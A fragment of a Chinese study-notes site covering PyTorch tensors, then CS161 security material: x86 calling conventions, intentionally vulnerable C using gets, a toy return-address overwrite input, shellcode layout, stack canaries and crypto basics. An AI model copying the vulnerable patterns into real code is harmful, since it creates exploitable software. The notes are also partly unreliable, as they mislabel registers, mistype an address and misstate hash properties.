<pre><code>x0 = torch.eye(3, dtype=torch.float64)  # Shape (3, 3), dtype torch.float64\nx1 = torch.zeros_like(x0)               # Shape (3, 3), dtype torch.float64\nx2 = x0.new_zeros(4, 5)                 # Shape (4, 5), dtype torch.float64\nx3 = torch.ones(6, 7).to(x0)            # to\u8868\u793a\u8be5\u5217\u8868\u6240\u9700\u7684\u7c7b\u578b\n</code></pre> <p>tensor\u7684\u7d22\u5f15\u548c\u5207\u7247</p> <p>Pytorch\u4e2dtensor\u7684\u5207\u7247\u9075\u5faa\u4ee5\u4e0b\u89c4\u5219</p> <pre><code>x = ten[\u6a2a\u5750\u6807\u5207\u7247, \u7eb5\u5750\u6807\u5207\u7247]\n# for example\nrow_r2 = a[1:2, :]  # Rank 2 view of the second row of a\n</code></pre> <p>\u5207\u7247\u8fd4\u56de\u7684\u662f\u5f15\u7528\uff0c\u5982\u679c\u6211\u4eec\u9700\u8981\u62f7\u8d1d\u8bed\u4e49\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528clone</p> <pre><code>c = a[0, 1:].clone()\n</code></pre> <p>\u540c\u65f6\u5207\u7247\u4e5f\u53ef\u4ee5\u505a\u8d4b\u503c\uff0c\u5bf9\u4e8e\u5f20\u91cf\u8fdb\u884c\u4fee\u6539\uff0c\u5176\u4e2dPytorch\u7ed9\u6211\u4eec\u63d0\u4f9b\u5f88\u591a\u7684\u7075\u6d3b\u505a\u6cd5\uff0c\u6bd4\u5982\u7528\u5355\u4e2a\u5143\u7d20\u8868\u793a\u7528\u8be5\u5143\u7d20\u586b\u5145\u5207\u7247\u7684\u6240\u6709\u90e8\u5206</p> <pre><code>a = torch.zeros(2, 4, dtype=torch.int64)\na[:, :2] = 1\na[:, 2:] = torch.tensor([[2, 3], [4, 5]])\nprint(a)\n</code></pre> <p>CPU or GPU</p> <p>\u9ed8\u8ba4\u521b\u5efa\u7684tensor\u662fCPU\u8fd0\u884c\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7to\u65b9\u6cd5\u6216\u8005cuda\u65b9\u6cd5\u5c06\u5176\u8f6c\u6362\u6210GPU tensor</p> <p>tips\uff1a\u5982\u679c\u6211\u4eec\u9700\u8981\u6bd4\u8f83CPU\u548cGPU\u7684\u65f6\u95f4\u7684\u8bdd\uff0c\u9700\u8981\u91c7\u7528<code>torch.cuda.synchronize</code>\u200b\u6765\u540c\u6b65\u4e24\u8005\u7684\u65f6\u95f4</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/","title":"computer system security","text":"<p>CS161\u5b66\u4e60</p> <ul> <li> \u8bfe\u7a0b\u7f51\u7ad9</li> <li> project1 \u4e3b\u8981\u662f\u4e00\u4e9b\u6ea2\u51fa\u653b\u51fb\u7684\u8bad\u7ec3\uff0c\u5b9e\u64cd\u4e86\u67e5\u6c47\u7f16\u548c\u5199\u811a\u672c\uff0c\u65e0\u9700\u6d4b\u8bd5\u7a0b\u5e8f</li> <li> project2 \u672a\u5b8c\u6210 \u9700\u8981\u5b66\u4e60go\u57fa\u7840</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/","title":"Cimage](assets/1708312025030-20240219110720-dxq43v4.png)","text":"<p>\u200b</p> <p>x86\u662f\u5c0f\u7aef</p> <p>register</p> <p>\u5bc4\u5b58\u5668\u5728x86\u4e2d\u4e5f\u662f\u4e00\u4e2a\u5bf9\u5e94\u4e00\u4e2aword\uff0c\u5176\u4e2d\u6709\u4e00\u4e9b\u7279\u6b8a\u7684\u5bc4\u5b58\u5668</p> <ul> <li>eip \u4e5f\u5c31\u662fpc</li> <li>ebp \u6808\u9876\u6307\u9488\uff0c\u4e5f\u5c31\u662ffp</li> <li>esp  \u6808\u5e95\u6307\u9488\uff0c\u4e5f\u5c31\u662fsp</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#stack-push-and-pop","title":"stack push and pop","text":"<p>when we want to push a value into stack</p> <ol> <li>esp\u4e0b\u79fb</li> <li>\u5728\u8fd9\u5757\u533a\u95f4\u91cc\u5b58\u50a8\u6211\u4eec\u7684\u6570\u636e</li> </ol> <p>pop\u6307\u4ee4\u5c31\u662f\u505a\u76f8\u53cd\u7684\u64cd\u4f5c\uff0c\u5e76\u5c06\u6570\u636e\u62f7\u8d1d\u5230\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u4e0a</p> <p>\u5728x86\u4e2d\u6211\u4eec\u6709push\u548cpop\u6307\u4ee4\u5b9e\u73b0\u4e86\u4e0a\u8ff0\u7684\u64cd\u4f5c</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#instruction","title":"instruction","text":"<p>\u5728\u672c\u8bfe\u7a0b\u7684x86\u91c7\u7528AT&amp;T\u7684\u6807\u51c6\uff0c\u4e00\u822c\u76ee\u6807\u5bc4\u5b58\u5668\u653e\u5728\u6307\u4ee4\u7684\u6700\u540e</p> <p>\u200b<code>addl $0x8, %ebx</code>\u200b \u4e0a\u8ff0\u6307\u4ee4\u7684\u542b\u4e49\u662febx\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u81ea\u52a0 8</p> <ul> <li>\u5bc4\u5b58\u5668\u7684\u8c03\u7528\u9700\u8981\u52a0\u4e0a%</li> <li>\u5e38\u6570\u7684\u4f7f\u7528\u8981\u52a0\u4e0a $</li> <li>\u5185\u5b58\u7684\u5f15\u7528\u7684\u505a\u6cd5\u662f \u5e38\u6570(\u5730\u5740) \u4f8b\u5982<code>12(%esp)</code>\u200b \u6307esp\u5730\u5740\u540e12\u4e2abytes\u7684\u503c</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#function-calls","title":"function calls","text":"<p>\u5728\u53d1\u751f\u51fd\u6570\u8c03\u7528\u7684\u65f6\u5019\uff0c\u6808\u7a7a\u95f4\u4f1a\u5206\u914d\u76f8\u5e94\u7684\u7a7a\u95f4\uff08\u4e5f\u5c31\u662fesp\u4e0b\u79fb\uff09\u7ed9\u4e34\u65f6\u53d8\u91cf\u548c\u51fd\u6570\u7684\u5176\u4ed6\u4fe1\u606f\uff08\u53c2\u6570\u548ceip\uff0cedp\uff09\uff1b\u5728\u51fd\u6570\u8c03\u7528\u8fd4\u56de\u7684\u65f6\u5019\uff0c\u6808\u7a7a\u95f4\u5206\u914d\u7684\u7a7a\u95f4\u4f1a\u88ab\u91ca\u653e</p> <p>\u5728\u53d1\u751f\u51fd\u6570\u8c03\u7528\u7684\u65f6\u5019\uff0c\u4ee5\u4e0b\u5bc4\u5b58\u5668\u9700\u8981\u66f4\u65b0</p> <ul> <li>eip \u540cpc\uff0c\u9700\u8981\u6307\u5411\u65b0\u7684\u6307\u4ee4</li> <li>edp and esp \u8fd9\u4e24\u4e2a\u5bc4\u5b58\u5668\u6307\u5411\u6808\u7a7a\u95f4\u7684\u9876\u90e8\u548c\u5e95\u90e8\uff0c\u5b83\u4eec\u5c06\u4f1a\u4ececaller\u7684\u6808\u7a7a\u95f4\u8f6c\u6362\u6210callee\u7684\u6808\u7a7a\u95f4</li> </ul> <p>\u548criscv\u4e0d\u540c\u7684\u662f\uff0crisc\u4e2d\u6709\u4e13\u95e8\u7684\u5bc4\u5b58\u5668\u5904\u7406\u51fd\u6570\u7684\u53c2\u6570\uff0c\u800cx86\u4f1a\u628a\u53c2\u6570\u76f4\u63a5\u5b58\u50a8\u5728\u6808\u4e2d</p> <p>x86\u7684\u51fd\u6570\u8c03\u7528\u4e00\u5171\u6709 11 \u4e2a\u6b65\u9aa4</p> <pre><code>main:\n    # Step 1. Push arguments on the stack in reverse order\n    push $2\n    push $1\n\n    # Steps 2-3. Save old eip (rip) on the stack and change eip\n    call foo\n\n    # Execution changes to foo now. After returning from foo:\n\n    # Step 11: Remove arguments from stack\n    add $8, %esp\n\nfoo:\n    # Step 4. Push old ebp (sfp) on the stack\n    push %ebp\n\n    # Step 5. Move ebp down to esp\n    mov %esp, %ebp\n\n    # Step 6. Move esp down\n    sub $16, %esp\n\n    # Step 7. Execute the function (omitted here)\n\n    # Step 8. Move esp\n    mov %ebp, %esp\n\n    # Step 9. Restore old ebp (sfp)\n    pop %ebp\n\n    # Step 10. Restore old eip (rip)\n    pop %eip\n</code></pre> <p>step9-10 \u6709\u65f6\u4e5f\u88ab\u7b80\u5199\u4e3a<code>leave ret</code>\u200b</p> <p>\u200b\u200b</p> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#memory-safety","title":"memory safety","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#buffer-overflow","title":"buffer overflow","text":"<p>\u7f13\u51b2\u6ea2\u51fa\u662f\u4e00\u79cd\u5e38\u89c1\u7684\u9519\u8bef\uff0c\u5728c\u7b49\u8bed\u8a00\u4e2d\u5c24\u4e3a\u5e38\u89c1\uff0c\u662f\u6307\u7a0b\u5e8f\u5458\u672a\u80fd\u8fdb\u884c\u8db3\u591f\u7684\u8fb9\u754c\u68c0\u67e5\uff0c\u4ece\u800c\u89e6\u53d1\u8d85\u51fa\u5185\u5b58\u533a\u57df\u7684\u8d8a\u754c\u5185\u5b58\u8bbf\u95ee</p> <p>\u9996\u5148\uff0cC\u4e0d\u5b58\u5728\u5bf9\u4e8e\u6570\u7ec4\u8fb9\u754c\u7684\u4e25\u683c\u68c0\u67e5</p> <pre><code>char buf[8];\nint authenticated = 0;\nvoid vulnerable() {\n    gets(buf);\n}\n</code></pre> <p>\u4f8b\u5982\u4e0a\u8ff0\u7a0b\u5e8f\uff0cc\u505agets\u7684\u65f6\u5019\uff0c\u5e76\u4e0d\u4f1a\u68c0\u67e5buf\u7684\u8fb9\u754c\uff0c\u800c\u662f\u4f1a\u628a\u591a\u4f59\u7684\u6570\u636e\u7ee7\u7eed\u5199\u5230\u540e\u9762\u7684\u5185\u5b58\u533a</p> <p>C\u4e5f\u4e0d\u5b58\u5728\u5bf9\u4e8e\u6307\u9488\u8bbf\u95ee\u7684\u4e25\u683c\u68c0\u67e5</p> <pre><code>int (*fnptr)();\n</code></pre> <p>\u5bf9\u4e8e\u8fd9\u6837\u4e00\u4e2a\u51fd\u6570\u6307\u9488\u53d8\u91cf\uff0cC\u5141\u8bb8\u5404\u79cd\u8986\u5199\uff0c\u4f7f\u5f97\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u7a0b\u5e8f\u8df3\u8f6c\u5230\u4efb\u610f\u4ed6\u4eec\u60f3\u8981\u7684\u5730\u65b9\uff0c\u8fd9\u79cd\u884c\u4e3a\u88ab\u79f0\u4e3amalicious code injection attack\u6076\u610f\u4ee3\u7801\u6ce8\u5165\u653b\u51fb</p> <p>stack smash</p> <p>\u4e0a\u8ff0\u7684\u6ea2\u51fa\u95ee\u9898\u4e3b\u8981\u51fa\u73b0\u5728\u6ea2\u51fabuf\u540e\u9762\u8ddf\u968f\u7740\u5173\u952e\u6570\u636e\u6216\u8005\u51fd\u6570\u6307\u9488\uff0c\u5728\u5b9e\u9645\u4e2d\u5e76\u4e0d\u5e38\u89c1</p> <p>\u800c\u6839\u636ex86\u7684\u5806\u6808\u5b58\u50a8\u5f62\u5f0f\u8fdb\u884c\u653b\u51fb\u5219\u66f4\u4e3a\u6709\u6548</p> <pre><code>void vulnerable() {\n    char buf[8];\n    gets(buf);\n}\n</code></pre> <p>\u5bf9\u4e8e\u4e0a\u8ff0\u4ee3\u7801</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u7684\u8f93\u5165\u8db3\u591f\u957f\u65f6\uff0c\u53ef\u4ee5\u8986\u76d6rip\uff08\u8001\u7684eip\uff09\uff0csfp\uff0c\u5f53\u6211\u4eec\u8fd4\u56de\u7684\u65f6\u5019\u5c31\u4f1a\u8fd4\u56de\u5230\u65b0\u7684rip\u6307\u5411\u7684\u5730\u65b9</p> <p>tips\uff0c\u6211\u4eec\u7684\u6808\u7a7a\u95f4\u662f\u5411\u4e0b\u589e\u957f\u7684\uff0c\u4f46\u662f\u5199\u5165\u4f9d\u65e7\u662f\u5411\u4e0a\u5199\u7684</p> <p>\u4e0a\u8ff0\u6a21\u578b\u662f\u4e00\u4e2a\u7406\u8bba\u60c5\u5f62\uff0c\u5b9e\u9645\u7684\u7a0b\u5e8f\u4e2d\uff0cbuf\u548csfp\uff0crip\u4e4b\u95f4\u4e00\u822c\u4f1a\u6709\u4e00\u4e9bpadding\u7a7a\u95f4</p> <p>\u5bf9\u4e8e\u4e0a\u8ff0\u4ee3\u7801\uff0c\u5199\u5165<code>AAAAAAAAAAAA\\xef\\xbe\\xad\\xde</code>\u200b \u5c31\u53ef\u4ee5\u4f7f\u5f97\u51fd\u6570\u8fd4\u56de\u65f6\u8df3\u8f6c\u5230<code>0xDEADEEF</code>\u200b \u8be5\u8f93\u5165\u4e0e\u7cfb\u7edf\u7684\u5927\u5c0f\u7aef\u6709\u5173</p> <p>shellcode</p> <p>\u5f88\u591a\u65f6\u5019\u6ce8\u5165\u653b\u51fb\u7684\u7ed3\u679c\u662f\u751f\u4ea7\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u7684shell\uff0c\u8ba9\u653b\u51fb\u8005\u6267\u884c\u5404\u79cd\u64cd\u4f5c</p> <p>\u200b<code>[shellcode] + [4 bytes of garbage] + [address of buf]</code>\u200b</p> <p>shellcode\u5c31\u653e\u5728buf\u5185\u90e8\uff0c\u7136\u540e\u6309\u7167\u4e0a\u8ff0\u65b9\u6cd5\u8986\u76d6rip\uff0c\u6211\u4eec\u4e00\u822c\u4f1a\u628ashellcode\u653e\u5728rip\u7684\u4e0a\u9762\uff0c\u6240\u4ee5\u4f1a\u628arip\u8986\u76d6\u4e3a address(rip) + 4</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#integer-conversion-vulnerabilities","title":"integer conversion vulnerabilities","text":"<p>C\u7f16\u8bd1\u5668\u4e0d\u4f1a\u8b66\u544asigned int \u548c unsigned int\u4e4b\u95f4\u7684\u8f6c\u6362\uff0c\u5e76\u4e14\u5728\u6574\u6570\u7684\u6ea2\u51fa\u60c5\u5f62\u4e0b\u4e5f\u4e0d\u4f1a\u7ed9\u51fa\u76f8\u5e94\u7684\u4fe1\u606f</p> <pre><code>void vulnerable() {\n    size_t len;\n    char *buf;\n\n    len = read_int_from_network();\n    buf = malloc(len+5);\n    read(fd, buf, len);\n    ...\n}\n</code></pre> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#mitigating-memory-safety-vulnerabilities","title":"Mitigating Memory-Safety Vulnerabilities","text":"<p>\u6700\u76f4\u63a5\u4e14\u6709\u6548\u7684\u65b9\u6cd5\u5c31\u662f\u76f4\u63a5\u4f7f\u7528\u5185\u5b58\u5b89\u5168\u7684\u8bed\u8a00\uff0c\u4f8b\u5982Java, Python, Go, Rust, Swift</p> <p>\u4f46\u5f53\u6211\u4eec\u4e0d\u5f97\u4e0d\u4f7f\u7528\u90a3\u4e9b\u975e\u5185\u5b58\u5b89\u5168\u7684\u8bed\u8a00\u65f6\uff0c\u4e5f\u5df2\u7ecf\u6709\u4e86\u5f88\u591a\u673a\u5236\u6765\u9632\u6b62\u5185\u5b58\u653b\u51fb</p> <p>linux\u5bf9\u6297\u6808\u6ea2\u51fa\u673a\u5236</p> <p>stack canaries\uff0c\u662f\u4e00\u79cd\u5bf9\u6297\u6808\u6ea2\u51fa\u653b\u51fb\u7684\u6280\u672f\uff0c\u5728rip\u7684\u5730\u5740\u7684\u66f4\u4f4e\u5904\u653e\u7f6e\u4e00\u4e2a\u968f\u673a\u6570\uff0c\u56e0\u4e3a\u5229\u7528buf\u8986\u76d6rip\u52bf\u5fc5\u8981\u8986\u76d6\u5176\u66f4\u4f4e\u4f4d\u7f6e\u7684\u90e8\u5206\uff0c\u5728\u51fd\u6570\u8fd4\u56de\u65f6\u68c0\u67e5\u8be5\u968f\u673a\u6570\u662f\u5426\u88ab\u4fee\u6539\uff0c\u4ece\u800c\u68c0\u6d4b\u51fa\u6808\u653b\u51fb</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#cryptography","title":"Cryptography","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#basic-concepts","title":"basic concepts","text":"<p>\u6211\u4eec\u5728\u672c\u6b21\u7684\u5bc6\u7801\u5b66\u5b66\u4e60\u4e2d\u4f1a\u53cd\u590d\u4f7f\u7528\u4e00\u4e2a\u4f8b\u5b50\uff0cAlice and Bob \u9700\u8981\u901a\u4fe1\uff0cEve\u60f3\u8981\u7a83\u542c\u901a\u4fe1\uff0cMallory\u9700\u8981\u7be1\u6539\u901a\u4fe1\u5185\u5bb9</p> <p>keys</p> <p>\u5bc6\u94a5\u662f\u73b0\u4ee3\u5bc6\u7801\u5b66\u7684\u57fa\u7840\u90e8\u5206\uff0c\u73b0\u4ee3\u8ba1\u7b97\u673a\u7cfb\u7edf\u4e2d\u5e38\u6709\u4e24\u4e2a\u5bc6\u94a5\u6a21\u578b\uff0c\u4e0d\u5bf9\u79f0\u5bc6\u94a5\u6a21\u578b\uff08asymmetric key model\uff09\u548c\u5bf9\u79f0\u5bc6\u94a5\u6a21\u578b\uff08symmetric key model\uff09</p> <p>\u4e00\u4e2a\u5bc6\u7801\u7cfb\u7edf\u7684\u6027\u8d28/\u76ee\u6807</p> <ul> <li>confidentiality \u673a\u5bc6\u6027\uff0c\u8868\u73b0\u4e3a\u7b2c\u4e09\u8005\u65e0\u6cd5\u8bfb\u53d6\u6211\u4eec\u4f20\u9012\u7684\u4fe1\u606f</li> <li>integrity \u5b8c\u6574\u6027\uff0c\u8868\u73b0\u4e3a\u7b2c\u4e09\u8005\u65e0\u6cd5\u5728\u4e0d\u88ab\u5bdf\u89c9\u7684\u60c5\u51b5\u4e0b\u4fee\u6539\u6211\u4eec\u8981\u4f20\u9012\u7684\u4fe1\u606f</li> <li>authenticity \u771f\u5b9e\u6027/\u8ba4\u8bc1\u6027 \u53ef\u4ee5\u786e\u5b9a\u662f\u7531\u67d0\u4eba\u53d1\u51fa\u7684\u4fe1\u606f</li> </ul> <p>symmetric key model \u548c asymmetric key model \u7684\u4e09\u79cd\u6027\u8d28\u8bc1\u660e</p> <p>kerckhoff's principle</p> <ul> <li>\u5bc6\u94a5\u5e94\u5f53\u662f\u5bc6\u7801\u7cfb\u7edf\u4e2d\u552f\u4e00\u9700\u8981\u4fdd\u5bc6\u7684\u4e1c\u897f</li> <li>\u5f53\u5bc6\u94a5\u88ab\u6cc4\u9732\u65f6\uff0c\u751f\u6210\u4e00\u4e2a\u65b0\u7684\u5bc6\u94a5\u5e94\u5f53\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u8fc7\u7a0b</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#symmetric-key-model","title":"symmetric key model","text":"<p>\u5bf9\u79f0\u6a21\u578b\u9996\u5148\u8981\u6c42\u53cc\u65b9\u80fd\u591f\u4ea4\u6362\u5bc6\u94a5\uff0c\u5426\u5219\u53cc\u65b9\u4e0d\u4f1a\u51ed\u7a7a\u4ea7\u751f\u4e00\u5bf9\u76f8\u540c\u7684\u5bc6\u94a5</p> <p>\u5bf9\u4e8econfidentiality \u6709\u4e00\u4e9b\u5f62\u5f0f\u4e0a\u7684\u5b9a\u4e49</p> <p>IND-CPA secure</p> <p>\u5728\u5141\u8bb8Eve\u660e\u6587\u653b\u51fb\u7684\u60c5\u5f62\u4e0b\uff0c\u53d1\u7ed9Alice\u4e24\u4efd\u5236\u5b9a\u7684\u4fe1\u606f\uff0c\u7ecf\u8fc7Alice\u52a0\u5bc6\u4e4b\u540e\uff0cEve\u901a\u8fc7\u89c2\u6d4b\u539f\u6587\u672c\u548c\u52a0\u5bc6\u540e\u6587\u672c\uff0c\u731c\u51c6\u5339\u914d\u539f\u6587\u672c\u548c\u52a0\u5bc6\u6587\u672c\u7684\u6982\u7387\u4e0d\u8d85\u8fc750%\uff0c\u5219\u8bf4\u660e\u8fd9\u4e2a\u52a0\u5bc6\u65b9\u5f0f\u662fIND-CPA secure\u7684</p> <p>\u4f46\u662f\u5bf9\u4e8eIND-CPA \u7684\u660e\u6587\u653b\u51fb\u662f\u6709\u4e00\u5b9a\u7684\u9650\u5236\u7684</p> <ul> <li>\u4e24\u4efd\u4fe1\u606f\u7684\u957f\u5ea6\u9700\u8981\u76f8\u540c\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c\u6211\u4eec\u5141\u8bb8\u5bc6\u6587\u6cc4\u9732\u660e\u6587\u7684\u957f\u5ea6</li> <li>\u8be5\u52a0\u5bc6\u8bf7\u6c42\u662f\u5b9e\u9645\u7684\u800c\u4e0d\u662f\u7406\u8bba\u4e0a\u7684\uff0c\u4e00\u822c\u9650\u5236\u5728O(N^k) k is constant</li> <li>Eve \u83b7\u53d6\u7684\u731c\u6d4b\u4f18\u52bf\u5e94\u5f53\u662f\u5b58\u5728\u5b9e\u9645\u542b\u4e49\u7684\uff0c\u4e0d\u80fd\u8bf4\u6211\u6bd450%\u591a\u4e862^\u4ebf\u6b21\u65b9\u5206\u4e4b\u4e00</li> </ul> <p>one time pad</p> <p>Alice and Bob\u5171\u4eabn-bit\u7684\u5bc6\u94a5\uff0c\u4ed6\u4eec\u5c06\u8fd9\u4e2an-bit\u7684\u5bc6\u94a5\u6bcf\u4e00\u4f4d\u968f\u673a\u8bbe\u7f6e\uff0850%\u4e3a1,50%\u4e3a0\uff09</p> <p>\u6b64\u65f6Alice\u60f3\u8981\u53d1\u9001\u4e00\u4e2an-bit\u7684message\uff08\u6211\u4eec\u8bb0\u4e3aM\uff09\uff0c\u5c06M\u548c\u5bc6\u94a5\u505a\u4f4d\u5f02\u6216\uff0c\u5c31\u5b8c\u6210\u4e86\u52a0\u5bc6</p> <p>\u53ea\u8981Bob\u62e5\u6709\u5bc6\u94a5\uff0c\u5f88\u5bb9\u6613\u5c31\u80fd\u628a\u5bc6\u6587\u8fd8\u539f\u56de\u6765\uff0c\u518d\u505a\u4e00\u4e2a\u5f02\u6216\u5373\u53ef</p> <p>\u200b\u200b</p> <p>tip\u5728\u4e8e\uff0c\u5728\u5b58\u5728\u660e\u6587\u653b\u51fb\u7684\u60c5\u51b5\u4e0b\uff0c\u6bcf\u4e2a\u5bc6\u94a5\u4e0d\u53ef\u591a\u6b21\u4f7f\u7528\u4e8e\u4e0d\u540c\u6587\u672c</p> <p>block ciphers</p> <p>\u5206\u7ec4\u7684\u5bc6\u94a5\uff0c\u662f\u53ef\u4ee5\u91cd\u590d\u4f7f\u7528\u7684\u5171\u4eab\u5bc6\u94a5\uff0c\u628a\u4e00\u4e2a\u5b9a\u957f\u7684n-bit\u8f93\u5165\u8f6c\u6362\u6210\u4e00\u4e2a\u5b9a\u957f\u7684n-bit\u8f93\u51fa</p> <p>\u4e00\u4e2ablock ciphers\u5e94\u5f53\u67092^k \u4e2d\u52a0\u5bc6\u65b9\u5f0f\uff0c\u7528\u4e00\u4e2ak-bit\u7684\u8f93\u5165\u6765\u786e\u5b9a\u52a0\u5bc6\u65b9\u5f0f</p> <p>\u5bf9\u4e8e\u76f8\u540c\u7684\u8f93\u5165\u548c\u5bc6\u94a5\uff0c\u5fc5\u987b\u7ed9\u51fa\u76f8\u540c\u8f93\u51fa\uff0c\u56e0\u6b64\u5176\u672c\u8eab\u4e0d\u662fIND-CPA\u7684</p> <p>block ciphers \u662f\u5c55\u73b0\u4e3a\u4e00\u7ec4\u51fd\u6570\u7684\u6027\u8d28</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#cryptographic-hashes","title":"Cryptographic hashes","text":"<p>cryptographic hash function\u662f\u4e00\u79cd\u51fd\u6570\uff0c\u7528\u6765\u7ed9\u6587\u672c\u751f\u6210\u4e00\u4e2a\u7279\u6b8a\u7684\u503c\uff0c\u8fd9\u4e2a\u503c\u76f8\u5f53\u4e8e\u8be5\u6587\u672c\u7684\u6307\u7eb9\uff0c\u4e0d\u8bba\u4ee5\u4efb\u4f55\u5f62\u5f0f\u7ec6\u5fae\u5730\u4fee\u6539\u6587\u672c\uff0c\u90fd\u4f1a\u5bfc\u81f4\u751f\u6210\u4e0d\u540c\u7684hash\u503c</p> <p>\u6563\u5217\u51fd\u6570\u4e00\u822c\u6709\u4ee5\u4e0b\u7279\u5f81</p> <ul> <li>\u76f8\u540c\u7684\u8f93\u5165\u6709\u76f8\u540c\u7684\u8f93\u51fa\uff0c\u4e0d\u540c\u7684\u8f93\u5165\u5fc5\u7136\u6709\u4e0d\u540c\u7684\u8f93\u51fa</li> <li>\u5e38\u89c1\u7684\u54c8\u5e0c\u51fd\u6570\u7684\u8f93\u51fa\u662f\u56fa\u5b9a\u957f\u5ea6\u7684\uff0c\u4f8b\u5982git\u91cc\u9762\u4f7f\u7528\u7684SHA256</li> <li>preimage resistant \u5bb9\u6613\u6b63\u5411\u8ba1\u7b97hash\u503c\uff0c\u4f46\u96be\u4ee5\u4ecehash\u503c\u63a8\u65ad\u8f93\u5165</li> <li>collision resistant \u4f7f\u7528\u8005\u65e0\u6cd5\u627e\u5230\u4efb\u610f\u4e24\u4e2ax1, x2\uff0c\u4f7f\u5f97\u5b83\u4eec\u6709\u76f8\u540c\u7684hash\u503c</li> </ul> <p>\u7b80\u800c\u8a00\u4e4b\uff0c\u653b\u51fb\u8005\u65e0\u6cd5\u5728\u4e0d\u4fee\u6539hash\u503c\u7684\u60c5\u51b5\u4e0b\u4fee\u6539\u4fe1\u606f\u672c\u8eab</p> <p>hash function\u4e5f\u4e3a\u901a\u4fe1\u53cc\u65b9\u6821\u9a8c\u4e24\u4e2a\u6587\u672c\u662f\u5426\u4e00\u81f4\u63d0\u4f9b\u4e86\u7b80\u5355\u7684\u65b9\u6cd5\uff0c\u6bd4\u5982\u6211\u4eec\u9700\u8981\u9a8c\u8bc1\u5b89\u88c5\u7684\u8f6f\u4ef6\u662f\u5426\u5b8c\u6574\uff0c\u53ef\u4ee5\u8ba1\u7b97\u5176hash\u503c\u4e0e\u5b98\u65b9\u53d1\u5e03\u7684hash\u503c\u662f\u5426\u4e00\u81f4</p> <p>hash \u7b97\u6cd5</p> <p>\u73b0\u9636\u6bb5\uff0cSHA2\uff0cSHA3\u662f\u5e38\u89c1\u7684hash\u7b97\u6cd5\uff0c\u5e76\u4e14\u662f\u76ee\u524d\u65e0\u6cd5\u88ab\u7834\u89e3\u7684\uff0c\u6839\u636e\u8f93\u51fa\u7684bite\u6570\uff0c\u88ab\u79f0\u4e3aSHA3-256\uff0cSHA-384\u7b49\u7b49</p> <p>lowest hash schema</p> <p>\u5f53\u6570\u91cf\u6700\u591f\u5927\u7684\u65f6\u5019\uff0c\u6700\u4f4e\u6570\u91cf\u7684hash\u503c\u662f\u4f1a\u88abcover\u7684</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cs161/CS161%20computer%20security/#message-authentication-code","title":"Message authentication code","text":"<p>MAC \u6d88\u606f\u9a8c\u8bc1\u7801\uff0c\u662f\u5728\u5bf9\u79f0\u52a0\u5bc6\u7cfb\u7edf\u4e2d\u7ef4\u62a4\u4fe1\u606f\u5b8c\u6574\u6027\u548c\u8ba4\u8bc1\u6027\u7684\u529f\u80fd</p> <p>\u5176\u63a5\u6536\u56fa\u5b9a\u957f\u5ea6\u7684\u5bc6\u94a5\u548c\u4efb\u610f\u957f\u5ea6\u7684\u660e\u6587\uff0c\u751f\u6210\u4e00\u4e2a\u56fa\u5b9a\u957f\u5ea6\u7684\u6821\u9a8c\u7801\uff0c\u5176\u6700\u91cd\u8981\u7684\u6027\u8d28\u5728\u4e8e\u4efb\u610f\u5bf9\u4e8e\u660e\u6587\u7684\u6539\u52a8\u90fd\u4f1a\u5bfc\u81f4\u6821\u9a8c\u7801\u7684\u53d8\u5316</p> <p>\u540c\u65f6\u4e00\u4e2a\u5b89\u5168\u7684MAC\uff0c\u4e0d\u80fd\u8ba9\u4eba\u9488\u5bf9\u4e00\u4e2a\u672a\u77e5\u7684\u6587\u672c\u4ea7\u751f\u4e00\u4e2a\u6709\u6548\u7684MAC\u503c</p> <p>MAC\u662f\u88ab\u7528\u4e8e\u5df2\u77e5\u660e\u6587\u653b\u51fb\u7684</p> 